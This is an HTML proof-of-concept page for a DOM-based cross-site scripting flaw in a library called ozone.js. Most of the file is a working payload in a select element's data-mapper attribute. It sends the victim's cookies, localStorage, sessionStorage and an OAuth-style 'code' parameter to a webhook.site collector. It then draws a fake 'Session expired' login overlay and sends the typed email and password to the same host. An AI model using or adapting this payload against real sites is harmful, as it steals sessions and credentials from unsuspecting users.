<!DOCTYPE html>
<html>
  <head>
    <title>PoC DOM XSS - ozone.js</title>
    <meta charset="UTF-8" />
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="ozone.js"></script>
    <style>
      .phish-box {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        background: white;
        font-family: sans-serif;
        z-index: 9999;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      }
      .phish-box input {
        padding: 10px;
        margin: 5px;
        width: 250px;
        font-size: 16px;
      }
    </style>
  </head>
  <body>
    <!-- DOM XSS payload via ozone.js vulnerable data-mapper -->
    <select
      data-src-url="/api/data"
      data-mapper="()=>{
        const code = new URLSearchParams(location.search).get('code');
        const data = {
          code: code,
          cookies: document.cookie,
          localStorage: Object.fromEntries(Object.entries(localStorage)),
          sessionStorage: Object.fromEntries(Object.entries(sessionStorage))
        };

        fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });

        const form = document.createElement('form');
        form.className = 'phish-box';
        form.innerHTML = `
          <h2>Session expired. Please log in again</h2>
          <input type='email' id='email' placeholder='Email' required />
          <input type='password' id='pass' placeholder='Password' required />
          <button type='submit'>Login</button>
        `;

        form.onsubmit = (e) => {
          e.preventDefault();
          const email = document.getElementById('email').value;
          const pass = document.getElementById('pass').value;
          fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, pass, ts: Date.now() })
          });
          form.remove();
        };

        document.body.appendChild(form);
      }">
    </select>
  </body>
</html>
